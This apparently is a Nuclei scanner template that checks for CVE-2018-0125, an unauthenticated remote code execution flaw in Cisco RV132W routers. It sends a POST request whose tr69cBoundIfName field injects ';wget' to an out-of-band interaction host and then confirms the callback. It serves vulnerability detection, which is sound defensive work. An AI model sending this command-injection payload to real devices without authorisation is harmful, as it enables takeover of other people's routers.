id: CVE-2018-0125

info:
  name: Cisco RV132W Unauthenticated WAN Remote Code Execution
  author: elouhi
  severity: medium
  tags: cve,cve2018,cisco,rce
  reference: https://vulners.com/seebug/SSV:97135

requests:
  - raw:
      - |
        POST /tr69cfg.cgi HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/2010010 1 Firefox/54.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.5
        Referer: {{Scheme}}://{{Host}}/tr69cfg.cgi
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        {{url_encode('submit_button=Basic_config&tr69cEnable=1&tr69cInformEnable=1&ipvEnable=0&tr69cInformInterval=300&tr69cAcsURL={{Scheme}}://{{Host}}&tr69cAcsUser=admin&tr69cAcsPwd=admin&tr69cConnReqUser=admin&tr69cConnReqPwd=admin&tr69cConnReqPort={{Port}}&tr69cNoneConnReqAuth=0&tr69cDebugEnable=0&tr69cAcsCert=&tr69cCpeCert=&downloadFileType=&tr69cBoundIfName=;wget {{interactsh-url}};&tr69cBindInterface=ETH_WAN_R&tr69=on&ipv=on&inform=on&informInterval=300&httpCategory={{Scheme}}://&acsURL={{Host}}&acsUser=admin&acsPwd=admin&debug=on&FileType=on&connReqAuth=on&connReqUser=admin&connReqPwd=admin&connReqPort={{Port}}&WANInterface=eth0.1')}}

    unsafe: true
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"


